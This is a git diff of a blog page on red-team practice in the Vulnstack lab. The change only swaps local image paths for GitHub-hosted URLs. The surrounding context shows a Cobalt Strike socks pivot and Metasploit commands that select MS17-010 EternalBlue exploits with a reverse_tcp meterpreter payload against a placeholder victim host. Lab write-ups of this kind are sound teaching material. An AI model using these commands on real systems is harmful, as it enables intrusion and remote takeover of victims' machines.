@@ -186,8 +186,8 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20201217154147ed2affb6e1b27e76c6.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202012171541bfca180a49bde7c28920.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202012171541e6af90a3ce07d3b249a5.png">
-<meta property="og:image" content="c:/Users/Tyao/AppData/Roaming/Typora/typora-user-images/image-20210510004625495.png">
-<meta property="og:updated_time" content="2021-05-09T16:53:35.520Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021051013367602817e4ffb459dec55.png">
+<meta property="og:updated_time" content="2021-05-10T05:36:11.193Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Vulnstack 红队实战">
 <meta name="twitter:description" content="找个时间简单学习一下内网渗透">
@@ -789,7 +789,7 @@
 <p>CS里</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks &lt;port&gt;</span><br></pre></td></tr></table></figure>
 
-<img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20210510004625495.png" alt="image-20210510004625495" style="zoom:80%;">
+<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021051013367602817e4ffb459dec55.png" alt="image-20210510004625495" style="zoom:80%;">
 
 <p>MSF里</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue_win8</span><br><span class="line">use exploit/windows/smb/ms17_010_psexec</span><br><span class="line"></span><br><span class="line">setg Proxies socks4:&lt;your host&gt;:&lt;port&gt;</span><br><span class="line">setg ReverseAllowProxy true</span><br><span class="line">set rhost &lt;victim host&gt;</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost &lt;your host&gt;</span><br><span class="line">set lport &lt;your port&gt;</span><br></pre></td></tr></table></figure>
